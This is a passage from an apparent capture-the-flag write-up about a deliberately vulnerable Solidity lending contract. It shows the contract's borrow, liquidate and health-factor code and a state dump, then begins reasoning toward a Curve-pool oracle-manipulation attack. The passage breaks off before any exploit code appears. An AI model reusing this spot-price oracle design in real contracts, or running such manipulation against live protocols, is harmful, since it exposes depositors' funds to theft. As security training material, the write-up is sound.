&lt;&#x2F;span&gt;&lt;span&gt;        emit Deposit(msg.sender, _assetId, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function borrow(uint256 _assetId, uint256 _amount) external nonReentrant {
&lt;&#x2F;span&gt;&lt;span&gt;        require(_assetId &amp;lt; assetCount, &amp;quot;Invalid asset&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_amount &amp;gt; 0, &amp;quot;Amount must be greater than 0&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        updateInterest(msg.sender, _assetId);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        UserAccount storage account = userAccounts[msg.sender];
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage asset = assets[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 newBorrowAmount = account.borrowed[_assetId] + _amount;
&lt;&#x2F;span&gt;&lt;span&gt;        account.borrowed[_assetId] = newBorrowAmount;
&lt;&#x2F;span&gt;&lt;span&gt;        asset.totalBorrowed += _amount;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 healthFactor = calculateHealthFactor(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        require(healthFactor &amp;gt;= MIN_HEALTH_FACTOR, &amp;quot;Borrow would result in undercollateralization&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(asset.token.transfer(msg.sender, _amount), &amp;quot;Transfer failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Borrow(msg.sender, _assetId, _amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function liquidate(address _borrower, uint256 _assetId, uint256 _amount, uint256 _collateralAssetId)
&lt;&#x2F;span&gt;&lt;span&gt;        external
&lt;&#x2F;span&gt;&lt;span&gt;        nonReentrant
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        require(_assetId &amp;lt; assetCount &amp;amp;&amp;amp; _collateralAssetId &amp;lt; assetCount, &amp;quot;Invalid asset&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_amount &amp;gt; 0, &amp;quot;Amount must be greater than 0&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_borrower != msg.sender, &amp;quot;Cannot liquidate own position&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_assetId != _collateralAssetId, &amp;quot;Cannot liquidate same asset&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        updateInterest(_borrower, _assetId);
&lt;&#x2F;span&gt;&lt;span&gt;        updateInterest(_borrower, _collateralAssetId);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        UserAccount storage borrowerAccount = userAccounts[_borrower];
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage borrowedAsset = assets[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage collateralAsset = assets[_collateralAssetId];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 healthFactor = calculateHealthFactor(_borrower);
&lt;&#x2F;span&gt;&lt;span&gt;        require(healthFactor &amp;lt; PRECISION, &amp;quot;Account not liquidatable&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 maxLiquidatable = borrowerAccount.borrowed[_assetId] * LIQUIDATION_CLOSE_FACTOR &#x2F; 100;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 actualLiquidation = Math.min(_amount, maxLiquidatable);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 realCollateralAmount = actualLiquidation * getAssetPrice(_assetId) &#x2F; getAssetPrice(_collateralAssetId);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralAmount = Math.min(realCollateralAmount, borrowerAccount.deposited[_collateralAssetId]);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 toLiquidate = collateralAmount * getAssetPrice(_collateralAssetId) &#x2F; getAssetPrice(_assetId);
&lt;&#x2F;span&gt;&lt;span&gt;        if (realCollateralAmount &amp;gt; borrowerAccount.deposited[_collateralAssetId]) {
&lt;&#x2F;span&gt;&lt;span&gt;            toLiquidate = toLiquidate * BAD_DEBT_RATIO &#x2F; 100;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(borrowedAsset.token.transferFrom(msg.sender, address(this), toLiquidate), &amp;quot;Transfer failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(collateralAsset.token.transfer(msg.sender, collateralAmount), &amp;quot;Transfer failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowerAccount.borrowed[_assetId] -= actualLiquidation;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowerAccount.deposited[_collateralAssetId] -= collateralAmount;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        borrowedAsset.totalBorrowed -= actualLiquidation;
&lt;&#x2F;span&gt;&lt;span&gt;        collateralAsset.totalDeposited -= collateralAmount;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Liquidate(msg.sender, _borrower, _assetId, actualLiquidation, _collateralAssetId, collateralAmount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function updateInterest(address _user, uint256 _assetId) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        UserAccount storage account = userAccounts[_user];
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage asset = assets[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (account.lastInterestBlock[_assetId] == block.number) {
&lt;&#x2F;span&gt;&lt;span&gt;            return;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 interestRate = getInterestRate(_assetId);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 blocksSinceLastUpdate = block.number - account.lastInterestBlock[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 interest =
&lt;&#x2F;span&gt;&lt;span&gt;            account.borrowed[_assetId] * interestRate * blocksSinceLastUpdate &#x2F; (365 days &#x2F; 15) &#x2F; PRECISION;
&lt;&#x2F;span&gt;&lt;span&gt;        account.borrowed[_assetId] += interest;
&lt;&#x2F;span&gt;&lt;span&gt;        asset.totalBorrowed += interest;
&lt;&#x2F;span&gt;&lt;span&gt;        account.lastInterestBlock[_assetId] = block.number;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getInterestRate(uint256 _assetId) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage asset = assets[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;        return asset.baseRate;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function calculateHealthFactor(address _user) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalCollateralInEth = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalBorrowedInEth = 0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for (uint256 i = 0; i &amp;lt; assetCount; i++) {
&lt;&#x2F;span&gt;&lt;span&gt;            Asset storage asset = assets[i];
&lt;&#x2F;span&gt;&lt;span&gt;            UserAccount storage account = userAccounts[_user];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            totalCollateralInEth += collateralInEth;
&lt;&#x2F;span&gt;&lt;span&gt;            totalBorrowedInEth += borrowedInEth;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (totalBorrowedInEth == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            return type(uint256).max;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return totalCollateralInEth * PRECISION &#x2F; totalBorrowedInEth;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getAssetPrice(uint256 _assetId) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        if (priceOracles[_assetId] == address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;            return 0;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-4&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-4&quot; aria-label=&quot;Anchor link for: solution-4&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;An interesting chall, we got a Lending protocol which uses two different price oracles to get the asset price.&lt;&#x2F;p&gt;
&lt;p&gt;Lets, observe the protocol first,&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Oracle (Main Contract)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;A lending protocol that allows users to deposit and borrow assets&lt;&#x2F;li&gt;
&lt;li&gt;Manages multiple assets with their respective price oracles&lt;&#x2F;li&gt;
&lt;li&gt;Handles liquidations and interest calculations&lt;&#x2F;li&gt;
&lt;li&gt;Uses two price oracles to determine asset values for collateralization&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SimplePriceOracle&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;A basic price oracle that returns a fixed price&lt;&#x2F;li&gt;
&lt;li&gt;Has an owner who can set the price&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CurvePriceOracle&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;More sophisticated oracle that gets prices from a Curve pool&lt;&#x2F;li&gt;
&lt;li&gt;Validates price against an anchor value&lt;&#x2F;li&gt;
&lt;li&gt;Can get both oracle price and spot price from the Curve pool&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The challenge involves manipulating these contracts to get &lt;code&gt;20,000 USDe&lt;&#x2F;code&gt; tokens when starting with &lt;code&gt;10,000&lt;&#x2F;code&gt; each of USDe and USDC. As usual let me see the initial state of this protocol,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;assetCount&lt;&#x2F;span&gt;&lt;span&gt; :  2
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;---------------Asset0----------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; address:  0x21Bbb929210149d6a849caF486ee0263404056AD
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; totalDeposited0 :  10000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; totalBorrowed0 :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; baseRate0 :  1
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; priceOracle :  0xaabD0F52b2743ff3AF409f3f19f8626255961699
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-----------------Asset1--------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; address:  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; totalDeposited1 :  10000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; totalBorrowed1 :  18500000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; baseRate1 :  1
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; priceOracle :  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;---------------Owner-----------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;deposited0&lt;&#x2F;span&gt;&lt;span&gt; :  10000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;borrowed0&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lastInterestedBlock0&lt;&#x2F;span&gt;&lt;span&gt; :  3566869
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;deposited1&lt;&#x2F;span&gt;&lt;span&gt; :  10000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;borrowed1&lt;&#x2F;span&gt;&lt;span&gt; :  18500000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lastInterestedBlock1&lt;&#x2F;span&gt;&lt;span&gt; :  3566869
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; balance :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; balance :  18500000000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;oracle&lt;&#x2F;span&gt;&lt;span&gt; asset0 balance :  90000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;oracle&lt;&#x2F;span&gt;&lt;span&gt; asset1 balance :  71500000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;---------------Player-----------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;deposited0&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;borrowed0&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lastInterestedBlock0&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;deposited1&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;borrowed1&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lastInterestedBlock1&lt;&#x2F;span&gt;&lt;span&gt; :  0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset0&lt;&#x2F;span&gt;&lt;span&gt; balance :  10000000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asset1&lt;&#x2F;span&gt;&lt;span&gt; balance :  10000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-------------Price&lt;&#x2F;span&gt;&lt;span&gt; Oracles---------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;simplePriceOracle:&lt;&#x2F;span&gt;&lt;span&gt;  0xaabD0F52b2743ff3AF409f3f19f8626255961699
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;simplePriceOracle&lt;&#x2F;span&gt;&lt;span&gt; asset0 Price :  1000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;curvePriceOracle&lt;&#x2F;span&gt;&lt;span&gt; (asset 1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;curvePriceOracle&lt;&#x2F;span&gt;&lt;span&gt; Curve Pool :  0x46206ede2b79e862D91BFa0CB4ce21EDFa7fC96f
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Curve&lt;&#x2F;span&gt;&lt;span&gt; asset1 Price :  1000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Curve&lt;&#x2F;span&gt;&lt;span&gt; SpotPrice :  1000000000000000000
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt; 0 in curve pool :  0x21Bbb929210149d6a849caF486ee0263404056AD
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt; 1 in curve pool :  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Thats a lot of info but,  I need at least this much to understood this protocol. So, looking at the initial state we can confirm that there are only two tokens in the lending Oracle contract and also the CurvePool oracle has also have the same tokens. As per the statement those two assets are &lt;code&gt;USDe&lt;&#x2F;code&gt; and &lt;code&gt;USDC&lt;&#x2F;code&gt; and we are given with &lt;code&gt;10000&lt;&#x2F;code&gt; amount of tokens each.&lt;&#x2F;p&gt;
&lt;p&gt;Can you guess? which one is the &lt;code&gt;USDe&lt;&#x2F;code&gt;? &lt;code&gt;asset0&lt;&#x2F;code&gt; or &lt;code&gt;asset1&lt;&#x2F;code&gt;?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;It&#x27;s asset0, cause it has the decimals of 18. USDe is 18 decimals and USDC is 6.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Owner has deposited &lt;code&gt;10000&lt;&#x2F;code&gt; of USDe, &lt;code&gt;10000&lt;&#x2F;code&gt; of USDC and borrowed &lt;code&gt;18500&lt;&#x2F;code&gt; of USDC.&lt;&#x2F;p&gt;
&lt;p&gt;What should we do?&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Can we directly &lt;code&gt;borrow()&lt;&#x2F;code&gt; &lt;code&gt;20000&lt;&#x2F;code&gt; USDe from the Oracle ? Yes If we have sufficient health factor.&lt;&#x2F;li&gt;
&lt;li&gt;Can we &lt;code&gt;liquidate()&lt;&#x2F;code&gt; owners collatoral and get all his collatoral asset ? Yes If can make owners health factor worse.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Both of above options depends on the health factor, lets see how the health factor is calculated.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function calculateHealthFactor(address _user) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 totalCollateralInEth = 0;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 totalBorrowedInEth = 0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    for (uint256 i = 0; i &amp;lt; assetCount; i++) {
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage asset = assets[i];
&lt;&#x2F;span&gt;&lt;span&gt;        UserAccount storage account = userAccounts[_user];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        totalCollateralInEth += collateralInEth;
&lt;&#x2F;span&gt;&lt;span&gt;        totalBorrowedInEth += borrowedInEth;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (totalBorrowedInEth == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;        return type(uint256).max;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    return totalCollateralInEth * PRECISION &#x2F; totalBorrowedInEth;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Health factor is being calculated based on the asset prices, Okay lets see how the asset price is fetched.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function getAssetPrice(uint256 _assetId) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;    if (priceOracles[_assetId] == address(0)) {
&lt;&#x2F;span&gt;&lt;span&gt;        return 0;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Interesting, this is using different price oracles for each asset. &lt;code&gt;SimplePriceOracle&lt;&#x2F;code&gt; is used for asset0, and &lt;code&gt;CurvePoolOracle&lt;&#x2F;code&gt; is used for asset1. &lt;code&gt;SimplePriceOracle&lt;&#x2F;code&gt; always returns the same price meaning we can&#x27;t manipulate this. But the &lt;code&gt;CurvePoolOracle&lt;&#x2F;code&gt; is fetching the price using &lt;code&gt;price_oracle&lt;&#x2F;code&gt; function of it.&lt;&#x2F;p&gt;
&lt;p&gt;We have the asset1(USDC), can we directly interact with &lt;code&gt;CurvePool&lt;&#x2F;code&gt; and do some deposit kind of thing these and change the price.??&lt;&#x2F;p&gt;
&lt;p&gt;Yes Bro, that&#x27;s is what the challenge is and that&#x27;s called &lt;code&gt;ORACLE MANIPULATION&lt;&#x2F;code&gt; too.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s see is that &lt;code&gt;CurvePool&lt;&#x2F;code&gt; is vulnerable to Oracle Manipulation or not?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;There was an hint in the statement, &quot;check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet&quot;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;So, the &lt;code&gt;CurvePool&lt;&#x2F;code&gt; deployed at that time might have this kind of vulnerability. Following the traces of the transaction in given in the statement got me a &lt;code&gt;CurveStableSwapNG&lt;&#x2F;code&gt; &lt;strong&gt;Vyper&lt;&#x2F;strong&gt; contract.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Now the grinding begins, I read all the documentation about this CurveStableSwapNG from here : &lt;a href=&quot;https:&#x2F;&#x2F;docs.curve.fi&#x2F;stableswap-exchange&#x2F;stableswap-ng&#x2F;pools&#x2F;metapool&#x2F;#remove_liquidity&quot;&gt;CurveStableSwapNG Metapool Docs&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Let me the paste the snippet that is matter to us.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;view
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nonreentrant&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;lock&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
